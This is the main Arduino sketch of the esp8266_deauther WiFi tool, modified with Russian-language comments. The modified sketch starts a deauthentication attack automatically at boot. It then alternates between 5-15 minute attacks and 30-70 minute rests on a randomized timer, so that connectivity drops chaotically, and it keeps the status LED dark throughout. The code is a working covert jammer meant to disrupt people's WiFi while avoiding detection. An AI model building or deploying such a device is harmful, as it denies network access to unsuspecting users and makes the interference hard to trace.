/* =====================
   This software is licensed under the MIT License:
   https://github.com/spacehuhntech/esp8266_deauther
   ===================== */

extern "C" {
    // Please follow this tutorial:
    // https://github.com/spacehuhn/esp8266_deauther/wiki/Installation#compiling-using-arduino-ide
    // And be sure to have the right board selected
  #include "user_interface.h"
}

#include "EEPROMHelper.h"

#include "src/ArduinoJson-v5.13.5/ArduinoJson.h"
#if ARDUINOJSON_VERSION_MAJOR != 5
// The software was build using ArduinoJson v5.x
// version 6 is still in beta at the time of writing
// go to tools -> manage libraries, search for ArduinoJSON and install version 5
#error Please upgrade/downgrade ArduinoJSON library to version 5!
#endif // if ARDUINOJSON_VERSION_MAJOR != 5

#include "oui.h"
#include "language.h"
#include "functions.h"
#include "settings.h"
#include "Names.h"
#include "SSIDs.h"
#include "Scan.h"
#include "Attack.h"
#include "CLI.h"
#include "DisplayUI.h"
#include "A_config.h"

#include "led.h"

// Run-Time Variables //
Names names;
SSIDs ssids;
Accesspoints accesspoints;
Stations     stations;
Scan   scan;
Attack attack;
CLI    cli;
DisplayUI displayUI;

simplebutton::Button* resetButton;

#include "wifi.h"

uint32_t autosaveTime = 0;
uint32_t currentTime  = 0;

bool booted = false;

// --- ПЕРЕМЕННЫЕ ХАОТИЧНОГО ТАЙМЕРА (5-15 / 30-70 МИНУТ) ---
unsigned long deauthPreviousMillis = 0;
unsigned long currentInterval = 300000; // Стартуем с 5 минут
bool attackState = true;                // true - атака включена, false - отдых

// Константы времени в миллисекундах (1 минута = 60000 мс)
const long minAttackTime = 300000;      // Минимальная атака: 5 минут
const long maxAttackTime = 900000;      // Максимальная атака: 15 минут

const long minRestTime = 1800000;      // Минимальный отдых: 30 минут
const long maxRestTime = 4200000;      // Максимальный отдых: 70 минут
// ---------------------------------------------------------

void setup() {
    // for random generator
    randomSeed(os_random());

    // start serial
    Serial.begin(115200);
    Serial.println();

    // start SPIFFS
    prnt(SETUP_MOUNT_SPIFFS);
    // bool spiffsError = !LittleFS.begin();
    LittleFS.begin();
    prntln(/*spiffsError ? SETUP_ERROR : */ SETUP_OK);

    // Start EEPROM
    EEPROMHelper::begin(EEPROM_SIZE);

#ifdef FORMAT_SPIFFS
    prnt(SETUP_FORMAT_SPIFFS);
    LittleFS.format();
    prntln(SETUP_OK);
#endif // ifdef FORMAT_SPIFFS

#ifdef FORMAT_EEPROM
    prnt(SETUP_FORMAT_EEPROM);
    EEPROMHelper::format(EEPROM_SIZE);
    prntln(SETUP_OK);
#endif // ifdef FORMAT_EEPROM

    // Format SPIFFS when in boot-loop
    if (/*spiffsError || */ !EEPROMHelper::checkBootNum(BOOT_COUNTER_ADDR)) {
        prnt(SETUP_FORMAT_SPIFFS);
        LittleFS.format();
        prntln(SETUP_OK);

        prnt(SETUP_FORMAT_EEPROM);
        EEPROMHelper::format(EEPROM_SIZE);
        prntln(SETUP_OK);

        EEPROMHelper::resetBootNum(BOOT_COUNTER_ADDR);
    }

    // get time
    currentTime = millis();

    // load settings
    #ifndef RESET_SETTINGS
    settings::load();
    #else // ifndef RESET_SETTINGS
    settings::reset();
    settings::save();
    #endif // ifndef RESET_SETTINGS

    wifi::begin();
    wifi_set_promiscuous_rx_cb([](uint8_t* buf, uint16_t len) {
        scan.sniffer(buf, len);
    });

    // start display
    if (settings::getDisplaySettings().enabled) {
        displayUI.setup();
        displayUI.mode = DISPLAY_MODE::INTRO;
    }

    // load everything else
    names.load();
    ssids.load();
    cli.load();

    // create scan.json
    scan.setup();

    // dis/enable serial command interface
    if (settings::getCLISettings().enabled) {
        cli.enable();
    } else {
        prntln(SETUP_SERIAL_WARNING);
        Serial.flush();
        Serial.end();
    }

    // start access point/web interface
    if (settings::getWebSettings().enabled) wifi::startAP();

    // STARTED
    prntln(SETUP_STARTED);

    // version
    prntln(DEAUTHER_VERSION);

    // setup LED
    led::setup();

    // setup reset button
    resetButton = new ButtonPullup(RESET_BUTTON);
    
    // Принудительный запуск атаки Deauth при старте платы
    attack.start(0); 
}

void loop() {
    currentTime = millis();

    // --- МОДУЛЬ АВТОМАТИЧЕСКОГО ХАОТИЧНОГО ТАЙМЕРА ---
    if (currentTime - deauthPreviousMillis >= currentInterval) {
        deauthPreviousMillis = currentTime;
        attackState = !attackState; // Переключаем фазу (атака -> отдых -> атака)

        if (attackState) {
            // Включаем атаку Deauth на сохраненные в памяти цели
            attack.start(0); 
            // Выбираем случайное время следующей атаки от 5 до 15 минут
            currentInterval = random(minAttackTime, maxAttackTime);
        } else {
            // Полностью останавливаем отправку пакетов (интернет восстанавливается)
            attack.stop();
            // Выбираем случайное время следующего отдыха от 30 до 70 минут
            currentInterval = random(minRestTime, maxRestTime);
        }
    }
    // -------------------------------------------------

    // Аппаратное выключение синего светодиода (пин 2) на протяжении всего цикла
    digitalWrite(2, HIGH); 
    // Отключение кастомной светодиодной индикации (если применимо)
    led::setMode(LED_MODE::IDLE);

    led::update();   // update LED color
    wifi::update();  // manage access point
    attack.update(); // run attacks
    displayUI.update();
    cli.update();    // read and run serial input
    scan.update();   // run scan
    ssids.update();  // run random mode, if enabled

    // auto-save
    if (settings::getAutosaveSettings().enabled
        && (currentTime - autosaveTime > settings::getAutosaveSettings().time)) {
        autosaveTime = currentTime;
        names.save(false);
        ssids.save(false);
        settings::save(false);
    }

    if (!booted) {
        booted = true;
        EEPROMHelper::resetBootNum(BOOT_COUNTER_ADDR);
#ifdef HIGHLIGHT_LED
        displayUI.setupLED();
#endif // ifdef HIGHLIGHT_LED
    }

    resetButton->update();
    if (resetButton->holding(5000)) {
        led::setMode(LED_MODE::SCAN);
        DISPLAY_MODE _mode = displayUI.mode;
        displayUI.mode = DISPLAY_MODE::RESETTING;
        displayUI.update(true);

        settings::reset();
        settings::save(true);

        delay(2000);

        led::setMode(LED_MODE::IDLE);
        displayUI.mode = _mode;
    }
}
